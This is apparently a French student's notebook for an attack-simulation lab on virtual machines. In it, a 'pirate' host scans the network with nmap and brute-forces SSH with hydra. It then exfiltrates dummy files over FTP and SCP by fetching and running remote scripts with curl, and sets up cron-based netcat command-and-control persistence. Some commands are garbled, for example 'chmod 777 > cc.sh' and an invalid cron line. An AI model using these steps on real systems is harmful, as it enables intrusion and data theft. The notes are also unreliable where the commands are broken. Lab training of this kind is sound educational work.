## serveurs / VM :

### www : 
- à installer :  
`sudo apt-get update -y`  
`sudo apt-get install -y apache`  
`sudo apt-get install –y php7  ` 
- avec fichier :
    - ping.php 
    - logs.php
### poste :
- à installer :  
`sudo apt-get update -y`    
`sudo apt-get install -y iptables`  
`sudo apt-get install -y openssh-server`



#### pirate :
- À installer :  
`sudo apt-get update -y`    
`sudo apt-get install -y wireshark`  
`sudo apt-get install -y tcpdump`  
- Mais aussi il faut installer ces paquets :
    - ##### partie client FTP :
    `sudo apt-get install -y filezilla`  
    `sudo apt-get install -y ftp`  
    `sudo apt-get install -y sleuthkit`   
    
    - ##### partie client SSH :
    
    `sudo apt-get install -y ssh`  

#### Serveur ftp-pirate :
- À installer :  
`sudo apt-get update -y`    
`sudo apt-get install -y vsftpd` 

#### Serveur ssh-pirate :
- À installer :  
`sudo apt-get update -y`  
`sudo apt-get install -y openssh-server`


#### Serveur cc-pirate :
- À installer :  
`sudo apt-get update -y`  



### depuis www
A6 )

le pirate va sur la page $ip_www/ping.php

```bash
sudo history  # historique des commandes

sudo apt-get install -y nmap  # installation avec yes

sudo apt-get install tcpdump -y && sudo tcpdump --interface any -c 400  -w data.pcap   # s'arrete après 400 paquets

ip a  #note l'adresse réseau 192.168.1.0

nmap -T4 -sP 192.168.1.0/24 | grep for  # scanne le réseau local de www

# // tu notes l'adresse IP qui est différente de www sauf Routeur

sudo dpkg -l > res.txt && cat res.txt && rm -rf res.txt  # listes des paquetages installés par rapport à l'indice A6
sudo dpkg -s | grep "Package"  # listes des paquetages installés par rapport à l'indice A6


sudo dpkg -l | grep -i "tcpdump"  # équivalent de Wireshark en ligne de commandes s'il est installé alors des fichiers pcap seront générables


sudo find / -name "*.pcap*"  # recherche tous les fichiers .pcap lisible avec Wireshark du disque dur ## noté les fichiers


sudo tcpdump -h

-r file



sudo tcpdump -r /home/etudiant/data.pcap # affiche en ligne de commande l'ensemble de la capture réseau du fichier .pcap en gros wireshark juste en ligne de commande
 
# étape optionnelle




sudo cp `sudo find / -name "*.pcap*"` /var/www/html/ 


```
// expliquer les paramètres de Nmap   
-T4 : Requête faite très rapidement  
-T5 : Requête faite ultra vite  
-T1 : Requête faite très lentement donc + de chances de trouver bcp d'appareils  

-sP : adresse source et test de port


https://www.hackingarticles.in/understanding-guide-nmap-ping-scan-firewall-bypass/#:~:text=Ping%20scan%20in%20nmap%20is%20done%20to%20check,behavior%20according%20to%20the%20network%20they%20are%20scanning.


Nmap utilise ARP car il détecte que ce réseau, envoie souvent des requêtes ARP mais dans le cas contraire Nmap utiliserait de l'ICMP

Si on teste en dehors du réseau local :

D'abord il envoie des requêtes ICMP, ensuite il vérifie le SYN sur le port 443 (par défaut pour le HTTPS: Well-known port)
Puis il vérifie si le port 80 peut lui renvoyer un acquittement ACK.Avec le protocole TCP



Nmap avec l'option :
    - -sn utilise le protocole ICMP OU --disable-arp-ping
    - -sP utilise le protocole ARP (ping sweep)
Nma

A7)

> [!WARNING]
> le pirate va sur la page $ip_www/ping.php
créer lorie sur poste de travail
sudo adduser lorie
rentrer le mot de passe
entrée à tout + y

avec un mot de passe dans la liste des 500 pires mot de passes
```bash
sudo cat auth.log # note le nom d'utilisateur du pc poste de travail
sudo find / -name "auth.log" 

# // filtrer sur le fichier pour avoir le nom d'utilisateur
sudo cat auth.log | grep "postedetravail" | cut -f 4 -d ' ' | uniq 
# // bruteforce
curl https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/500-worst-passwords.txt > 500-worst-passwords.txt 
hydra -l lorie -P 500-worst-passwords.txt $ip_postedetravail ssh 





```
A8)

- poste de travail

```bash
echo "confidentiel" > draft_iphone30.docx 
echo "database data" > client_database.sql
sudo apt-get update -y && apt-get install -y vsftpd
```



- Notes:
docx=word


-  ftp-pirate -> poste :
-  une fois automatisé
`curl https://raw.githubusercontent.com/amineAUPEC/kajan/main/ftp_transf.sh > ftp_transf.sh && sudo chmod +x ftp_transf.sh && sudo ./ftp_transf.sh`



- avant : d'automatiser

```bash
ftp poste 
ls
mput *
quit
```


- serveur pirate ftp
  - avant d'automatiser mais ce que l'on a fait
    ```bash
    ftp-pirate
    sudo nano /etc/vsftpd.conf 
    #   décommenter write_enable=yes
    sudo sytemctl restart vsftpd
    from poste to ftp-pirate
    mput *
    ```


A9) 
- côté poste : préparation :

```bash
echo 'byebye' > pots_de_vin1.xlsx  
echo 'naruto' > pots_de_vin8.xlsx  
echo 'hinataestnul' > pots_de_vinnaruto.xlsx  
```


- côté ssh-pirate : préparation : 

```bash
cd /home/etudiant && mkdir /home/etudiant/data

ssh $srv_entreprise
```


- serveur entreprise : mise en place du transfert : vers ssh-pirate
`curl https://raw.githubusercontent.com/amineAUPEC/kajan/main/scp_transf.sh > exfiltration.sh && sudo chmod +x exfiltration.sh && sudo ./exfiltration.sh`



- côté ssh-pirate :

```bash
cd /home/etudiant/data && ls -l
# pour afficher le butin
nano pots_de_vin*.xlsx 
```



A10)




- Serveur entreprise :

```bash
curl https://raw.githubusercontent.com/amineAUPEC/kajan/main/cc.sh > cc.sh
chmod 777 > cc.sh
mv cc.sh /etc

# lister les actions du fichier crontab
sudo crontab -l 

sudo export EDITOR=nano
sudo crontab -e





H 3 * * * /etc/cc.sh &> /dev/null


# ou
H 3 * * * nc -l -p 5659 &> /dev/null


# ou

00 3 * * * /etc/cc.sh &> /dev/null
```



- Serveur CC :

nc $ipsrventreprise 5689



A11)

serveur web :

```bash
sudo systemctl stop apache2


sudo apt-get install -y git docker-compose
sudo git clone && cd && sudo chmod +x && sudo ./dockerinstall.sh
cd && sudo docker-compose up -d
```




injection /simulation des clients : depuis poste :



attaque : depuis cc-pirate :





## définitions des IP

177.16.1.5 cc-pirate
<!-- 177.16.1.3 pirate  *obsolète* -->

## Explications :

-  VM vers hôte uniquement:réseau privé hôte (routeur) -> dédiée au SSH
-  VM vers VM voire hôte : Accès par pont : Réseau1bis(entreprise)
-  VM vers VM : Accès par pont : Réseau1(entreprise) 
-  VM vers VM : Accès par pont : Réseau2(pirate) 

Routeur fait liaison de Réseau1(entreprise)  vers Réseau2(pirate) 


- réseau privé hôte : 192.168.1.1 192.168.1.2 192.168.1.3
- Accès par pont : Réseau1(entreprise) : 192.168.1.21 (www) 192.168.1.56(Routeur) 192.168.1.X
- Accès par pont : Réseau2(pirate) : 172.16.110.X ...

liens   :
A6 )
https://www.makeuseof.com/tcpdump-examples/#:~:text=%20The%20tcpdump%20Output%20Format%20%201%20Timestamp,9%20Window%20size%2010%20Packet%20length%20More%20


A7)
https://www.kali-linux.fr/hacking/tutohydrabruteforce